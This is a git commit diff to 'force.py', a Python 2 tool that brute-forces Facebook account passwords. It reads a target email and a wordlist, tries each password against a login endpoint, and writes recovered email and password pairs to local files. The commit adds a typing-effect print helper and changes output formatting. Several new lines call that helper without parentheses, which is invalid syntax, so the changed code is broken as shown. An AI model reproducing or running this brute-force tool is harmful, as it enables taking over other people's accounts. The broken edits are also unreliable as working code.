72d4096da14a4aebf30b411af5fa8373476802bb
Zero-ZxXxAngel <65072876+Zero-ZxXxAngel@users.noreply.github.com>
2020-06-21 13:26:15 +0000

    Update force.py

--- src/force.py
+++ src/force.py
@@ -12,25 +12,31 @@ def keluar():
     print '\x1b[1;91m[!] Tutup'
     os.sys.exit()
 
+def jalan(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(random.random() * 0.1)
+
 def main():
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        jalan '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
-        time.sleep(0.5)
+        time.sleep(0.3)
         login()
     else:
         os.system('clear')
         print logo
-        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+        jalan '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
         try:
             email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
             passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(password.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+            jalan '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
@@ -44,7 +50,7 @@ def main():
                     mpsh = json.loads(data.text)
                     if 'access_token' in mpsh:
                         dapat = open('Brute.txt', 'w')
-                        dapat.write(email + ' | ' + pw + '\n')
+                        dapat.write(email + ' <==> ' + pw + '\n')
                         dapat.close()
                         print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                         print 52 * '\x1b[1;97m\xe2\x95\x90'
@@ -54,11 +60,11 @@ def main():
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
-                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.write(email + ' <==> ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
-                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
-                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            jalan  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                             keluar()
